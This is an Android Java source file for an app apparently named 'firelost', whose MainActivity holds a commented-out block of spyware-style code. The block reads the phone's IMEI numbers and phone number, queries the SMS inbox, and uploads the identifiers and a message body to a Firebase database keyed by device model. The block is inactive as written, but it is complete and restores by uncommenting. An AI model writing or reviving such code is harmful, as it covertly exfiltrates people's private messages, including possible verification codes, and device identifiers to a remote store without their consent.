package com.example.firelost;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class MainActivity extends AppCompatActivity {
TextView txt;
static MainActivity m;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        m=this;
//        txt=findViewById(R.id.txt);
//        txt.setMovementMethod(new ScrollingMovementMethod());
//        FirebaseDatabase database = FirebaseDatabase.getInstance();
//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//Toast.makeText(this,"set permissions 1st",Toast.LENGTH_LONG).show();
//            return;
//        }
//        String imei1 = telephonyManager.getDeviceId(0);
//        String phone = telephonyManager.getLine1Number();
//        String imei2=telephonyManager.getDeviceId(1);
//        String deviceModel = Build.MODEL;
//        Dev_po model=new Dev_po(imei1,imei2,phone);
//
//        DatabaseReference myRef = database.getReference("Devices");
//
//        myRef.child(deviceModel).setValue(model);
//
//
//
//        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
//        Message_po x=null;
//try {
//    if (cursor.moveToFirst()) { // must check the result to prevent exception
//        do {
//            String msgData = "\n";
//
//            for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
//if(cursor.getColumnName(idx).equals("body")) {
// msgData += " " + cursor.getColumnName(idx) + "->" + cursor.getString(idx);
//    x=new Message_po(cursor.getString(idx));
//
//
//}
//            }
//
//            txt.append("----------------------------------------------------------------------" + msgData+"\n");
//            break;
//        } while (cursor.moveToNext());
//    } else {
//    }
//    myRef.child("message"+deviceModel).setValue(x);
//}
//catch (Exception e)
//{
//
//}
    }
    static MainActivity getIstance(){
        return m;
    }
}
